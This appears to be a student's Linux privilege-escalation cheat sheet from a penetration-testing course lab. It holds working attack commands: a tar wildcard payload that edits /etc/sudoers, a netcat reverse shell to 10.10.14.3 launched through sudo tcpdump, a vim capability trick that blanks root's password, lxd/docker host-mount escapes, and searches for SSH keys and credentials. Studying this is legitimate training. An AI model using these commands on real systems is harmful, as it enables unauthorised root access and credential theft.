```
$ ps aux | grep root
```
%% command to check services running as root in case there is a flaw or misconfiguration %%

```
$ ps au
$ ls /home
```
%% check which users are logged into the system and current terminal-attached processes, also check for any interesting files on user home directory %%

```
$ls -l ~/.ssh
```
%% check ssh directory contents for e.g ssh keys and ARP cacheto see what other hosts are being accessed and cross-reference these against any useable SSH private keys%%

```
$ history
$ sudo -l
```
%% check bash history and list user's privileges %%

```
$ ls -la /etc/cron.daily/
```
%% check cron jobs similar to scheduled tasks in windows also search for .conf files, and try reading /etc/shadow if readable for any hashes %%

```
$lsblk
```
%% If you discover and can mount an additional drive or unmounted file system, you may find sensitive files, passwords, or backups that can be leveraged to escalate privileges. %%

```
$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```
%% discover which directories are writeable if you need to download tools to the system. You may discover a writeable directory where a cron job places files, which provides an idea of how often the cron job runs and could be used to elevate privileges if the script that the cron job runs is also writeable. %%

```
$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
%% Are any scripts or configuration files world-writable? While altering configuration files can be extremely destructive, there may be instances where a minor modification can open up further access. Also, any scripts that are run as root using cron jobs can be modified slightly to append a command. %%


### Environment enumeration
Commands to run when you encounter any linux distro:
- whoami - what user are we running as
- id - what groups does our user belong to?
- hostname - what is the server named, can we gather anything from the naming convention?
- ifconfig or ip a - what subnet did we land in, does the host have additional NICs in other subnets?
- sudo -l - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like sudo su and drop right into a root shell.

```
$ cat /etc/os-release
```
%% check what operating system and version is running %%

```
$ echo $PATH
```
%% check out our current user's PATH. If PATH variable for a target user is misconfigured we may be able to leverage it to escalate privileges %%

```
$ env
```
%% check out environment variables %%

```
$ uname -a
$ lscpu
$ cat /etc/shells
$ cat /etc/fstab
```
%% check kernel version, CPU type/version, shells available to us. mounted drives  for creds%%

```
$ grep "sh$" /etc/passwd
```
%% check which users have login shells then check each version for vunlerabilities %%

```
$ cat /etc/group
```
%% check for available gorups in /etc/grouip file showing us both the group name and assigned user names %%

```
$ getent group sudo
```
%%  The /etc/group file lists all of the groups on the system. We can then use the getent command to list members of any interesting groups. %%

```
$ df -h
$ cat /etc/fstab | grep -v "#" | column -t
```
%% check for mounted file systems. A mounted file system is one that is attached to a particular directory on the system and accessed through that directory. Second command is for checking for unmounted file systes which are ones no longer accessible on the system %%

```
$ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
$ find / -type d -name ".*" -ls 2>/dev/null
```
%% find all hidden files and directories respectively %%

```
$ cat /etc/hosts
$ lastlog
$ w
$ history
```
%% check hosts, user's last login,check if anyone else in the system with us with 'who' cmd, history command to check command history %%

```
$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```
%% Sometimes we can also find special history files created by scripts or programs. This can be found, among others, in scripts that monitor certain activities of users and check for suspicious activities %%

```
$ ls -la /etc/cron.daily/
```
%% It's also a good idea to check for any cron jobs on the system. Cron jobs on Linux systems are similar to Windows scheduled tasks. They are often set up to perform maintenance and backup tasks. %%

```
$ find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```
%% The proc filesystem (proc / procfs) is a particular filesystem in Linux that contains information about system processes, hardware, and other system information. It is the primary way to access process information and can be used to view and modify kernel settings. It can be used to look up system information such as the state of running processes, kernel parameters, system memory, and devices. %%

```
$ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
$ sudo -V
```
%% create a list of installed packages to start process of checking if there are any older packages or software installed that may have vulnerabilities . Check sudo version as well to help with this process.%%

```
$ ls -l /bin /usr/bin/ /usr/sbin/
```
%% at times there are no installed packages but you can check for binaries as well which can be run without installation. %%

```
$ for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done
```
%% GTFObins( https://gtfobins.org/)  provides an excellent platform that includes a list of binaries that can potentially be exploited to escalate our privileges on the target system. With the above oneliner, we can compare the existing binaries with the ones from GTFObins to see which binaries we should investigate later. %%

```
$ strace ping -c1 10.129.112.20
```
%%  We can use the diagnostic tool strace on Linux-based operating systems to track and analyze system calls and signal processing. It allows us to follow the flow of a program and understand how it accesses system resources, processes signals, and receives and sends data from the operating system. %%

```
$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```
%% Users can read almost all configuration files on a Linux operating system if the administrator has kept them the same. In addition, these files can contain sensitive information, such as keys and paths to files in folders that we cannot see. %%

```
$ find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```
%% same as above scripts can contain sensitive information %%

```
$ ps aux | grep root
```
%% check services run by a user to look for other escalation paths %%

### Credential Hunting
```
$ grep 'DB_USER\|DB_PASSWORD' wp-config.php
```
%% The /var directory typically contains the web root for whatever web server is running on the host. The web root may contain database credentials or other types of credentials that can be leveraged to further access. %%

```
$  find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```
%%  The spool or mail directories, if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e. MySQL connection strings, WordPress configuration files).%%

```
$  ls ~/.ssh
```
%% It is also useful to search around the system for accessible SSH private keys. We may locate a private key for another, more privileged, user that we can use to connect back to the box with additional privileges. We may also sometimes find SSH keys that can be used to access other hosts in the environment. Whenever finding SSH keys check the known_hosts file to find targets.  %%


### Path Abuse
```
$ echo $PATH
```
%% PATH is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary. %%

```
$ PATH=.:${PATH}
$ export PATH
$ echo $PATH
```
%% if we had a malicious script in our current directory for example ls. and use path command to add our current directory to PATH variable then if we ran ls it would run the script in our current directory instead of the one in /bin/ls %%

### Wildcard Abuse
```
$ man tar
$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
$ echo "" > "--checkpoint-action=exec=sh root.sh"
$ echo "" > --checkpoint=1
$ sudo -l
```
%% if you check tar command manual you notice that there is a checkpoint section that allows you to execute an EXEC action once we run the tar command. You can check sudo privileges after to confirm if the nopasswd executed successfully. %%

### Escaping Restricted Shells
```
$ ls -l `pwd` 
```
%% as the word says using characters to execute commands that are restricted on the shell. e.g using (;| etc) %%

### Special Permissions
```
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
%% command to find the programs or scrips with the setuid permission set which allows a user to execute that program/scripts as another user mostly with elevated privileges . It may be possible to reverse engineer the program with the SETUID bit set, identify a vulnerability, and exploit this to escalate our privileges. %%

```
$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
%% The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. %%

### GTFOBins
The [[[GTFOBins](https://gtfobins.org/)]] project is a curated list of binaries and scripts that can be used by an attacker to bypass security restrictions. Each page details the program's features that can be used to break out of restricted shells, escalate privileges, spawn reverse shell connections, and transfer files.

```
$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```
%% apt-get can be used to break out of restricted environments and spawn a shell by adding a Pre-Invoke command %%

### Sudo Rights Abuse
```
$ sudo -l
```
%% check if current user has any sudo privileges %%

```
$ cat /tmp/.test
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```
%% once you run sudo -l and tcpdump is one of the command s you can run as root with nopasswd you can leverage that with the -Z option when you run the tcpdump command to start a reverse shell on our attack machine and escalate to root %%

```
$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
$ nc -lvnp 443
```
%% tcpdump command to connect back to our listener on attack host %%

### Privileged Groups
```
$ unzip alpine.zip 
$ lxd init
$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
$ lxc init alpine r00t -c security.privileged=true
$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
$ lxc start r00t
$ lxc exec r00t /bin/sh
```
%% if you are a member of lxd after using id command you can follow these steps to escalate your privilege and spawn a shell in the container instance %%

```
$ docker run -v /root:/mnt -it ubuntu
```

%% this command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user.  %%

```
$ id
uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

%% Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs. %%

### Capabilities
```
$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```
%% When capabilities are set for a binary, it means that the binary will be able to perform specific actions that it would not be able to perform without the capabilities. For example, if the cap_net_bind_service capability is set for a binary, the binary will be able to bind to network ports, which is a privilege usually restricted. %%

```
$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
%%  This one-liner uses the find command to search for all binary executables in the directories where they are typically located and then uses the -exec flag to run the getcap command on each, showing the capabilities that have been set for that binary. %%

```
$ getcap /usr/bin/vim.basic
$ cat /etc/passwd | head -n1
$ /usr/bin/vim.basic /etc/passwd
$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
$ cat /etc/passwd | head -n1
```
%% For example, the /usr/bin/vim.basic binary is run without special privileges, such as with sudo. However, because the binary has the cap_dac_override capability set, it can escalate the privileges of the user who runs it. This would allow the penetration tester to gain the cap_dac_override capability and perform tasks that require this capability. We can use the cap_dac_override capability of the /usr/bin/vim binary to modify a system file: %%


### Cron Job Abuse

```
$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
%% command to look for any writeable files or directories. If we found a writeable file .sh especially a cron job, we can add a reverse shell one liner to the script that is running%%

```
$ ./pspy64 -pf -i 1000
```
%% command-line tool used to view running processes without the need for root privileges. The -pf flag tells the tool to print commands and file system events and -i 1000 tells it to scan procfs every 1000ms (or every second) %%

### Containers
```
$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
$ lxc image list
$ lxc init ubuntutemp privesc -c security.privileged=true
$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
%% if we are in the lxc or lxd group, we can run this sequence of commands to import a container image and configure it by specifying the security.privileged flag and the root path for the container.  %%

```
$ lxc start privesc
$ lxc exec privesc /bin/bash
# ls -l /mnt/root
```
%% Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the resource of the host system as root. %%